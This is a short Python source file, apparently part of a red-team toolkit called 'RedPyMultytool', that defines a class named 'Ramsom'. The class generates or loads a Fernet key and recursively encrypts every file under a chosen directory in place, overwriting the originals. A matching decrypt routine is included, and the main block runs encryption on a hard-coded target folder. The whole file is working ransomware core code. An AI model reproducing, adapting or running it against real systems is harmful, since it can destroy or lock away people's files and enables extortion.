from cryptography.fernet import Fernet
import os

class Ramsom:
    def __init__(self,Dirpath,keypath=""):
        if keypath=="":
            self.Key_gen() 
        else:
            with open(keypath,"r") as key: self.key=key.read()
        self.rootPath=Dirpath

    def getKey(self): return self.key

    def getRootPath(self): return self.rootPath

    def setRootPath(self, path): self.rootPath=path
    
    def setKey(self, keypath):
        with open(keypath,"r") as key: self.key=key.read()

    def Key_gen(self):
        self.key=Fernet.generate_key()
        with open("filekey.key","wb") as key:key.write(self.key)

    def crypt(self):
        '''prova'''
        print("encription Started....")
        self.cryptfolder(self.rootPath)
        print("encription finished")
    
    def decrypt(self):
        print("Decription Started....")
        self.decryptfolder(self.rootPath)
        print("Decription finished")

    def cryptfolder(self,path):
        for f in os.scandir(path):self.cryptfolder(path+"/"+f.name) if f.is_dir() else self.__CipherFile__(path+"/"+f.name)

    def decryptfolder(self,path):
        for f in os.scandir(path): self.decryptfolder(path+"/"+f.name) if f.is_dir() else self.__DecipherFile__(path+"/"+f.name)

    def __CipherFile__(self,path):
        ferCP=Fernet(self.key)
        with open(path,"rb") as plain: p=plain.read()
        with open(path,"wb") as orig: orig.write(ferCP.encrypt(p))

    def __DecipherFile__(self,path):
        ferDC=Fernet(self.key)
        with open(path,"rb") as cryp: dc=cryp.read()
        with open(path,"wb") as rest: rest.write(ferDC.decrypt(dc))
    

if __name__=="__main__":
    #Key_gen()
    r=Ramsom("/home/miky/Desktop/RedPyMultytool/TargetFolder","filekey.key")
    r.crypt()
    #r.decrypt()
    #cryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
    #decryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
